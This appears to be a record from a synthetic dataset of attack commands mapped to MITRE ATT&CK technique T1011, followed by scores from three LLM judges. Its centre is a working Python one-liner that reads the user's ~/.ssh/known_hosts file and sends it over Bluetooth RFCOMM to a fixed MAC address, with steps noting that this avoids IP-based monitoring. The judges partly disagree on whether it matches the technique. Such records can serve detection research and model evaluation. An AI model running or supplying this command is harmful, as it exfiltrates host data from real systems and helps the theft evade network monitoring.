{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
  "explanation": "Exfiltrates user-accessible SSH host metadata over Bluetooth RFCOMM (an alternate network medium) rather than the primary IP channel, aligning with T1011.",
  "rationale_steps": [
    "Select Bluetooth RFCOMM as a non-IP medium per T1011.",
    "Open a user-level RFCOMM socket to a nonstandard channel (19).",
    "Read ~/.ssh/known_hosts and transmit bytes over RFCOMM.",
    "Close the socket to minimize observable artifacts in IP-based monitoring."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-71de9821",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The Python one-liner has balanced quotes and parentheses, valid imports and socket API usage, and proper statement separators, making it parseable and runnable as-is.",
        "semantic_score": 4,
        "semantic_justification": "It reads ~/.ssh/known_hosts and transmits it over a Bluetooth RFCOMM socket to a specific MAC/channel, aligning with exfiltration over a non-IP medium (T1011), though success depends on Bluetooth support, permissions, and a listening peer.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-01T21:38:55.227937Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting timeout, connecting to a Bluetooth device, reading a file, and sending data.",
        "semantic_score": 4,
        "semantic_justification": "The command correctly implements exfiltration over an alternate channel (Bluetooth RFCOMM) as described in T1011, though it's using Python directly rather than abusing a system script proxy as the technique specifically describes.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T03:59:14.716860Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command uses valid syntax for module imports, socket creation and connection, file operations, and data transmission, correctly enclosed within command-line execution parameters.",
        "semantic_score": 2,
        "semantic_justification": "While the command performs data exfiltration using a script host (`python3`) which is an outcome T1011 enables, it does not demonstrate the core 'proxy execution' mechanism through another trusted *system script* as specified by the technique description.",
        "combined_score": 3.5,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:59:27.455379Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}